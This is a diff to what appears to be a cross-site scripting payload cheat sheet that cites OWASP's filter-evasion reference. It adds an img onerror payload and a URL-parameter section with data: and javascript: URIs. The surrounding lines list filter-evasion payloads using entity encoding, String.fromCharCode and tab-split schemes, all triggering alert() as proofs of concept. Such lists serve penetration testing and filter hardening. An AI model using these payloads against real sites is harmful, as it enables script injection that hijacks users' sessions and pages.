@@ -42,6 +42,7 @@ XSS in Image and HTML tags:
 <IMG SRC=# onmouseover="alert('xxs')">
 <IMG SRC= onmouseover="alert('xxs')">
 <IMG onmouseover="alert('xxs')">
+<img src=x onerror=alert()>
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 <IMG SRC="jav	ascript:alert('XSS');">
@@ -82,6 +83,9 @@ Using String.fromCharCode function:
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 
+XSS in URL parameters
+---------------------------
+data:html,alert() or data:text/JavaScript,alert(); or JavaScript:alert()
 
 Ref:
 https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
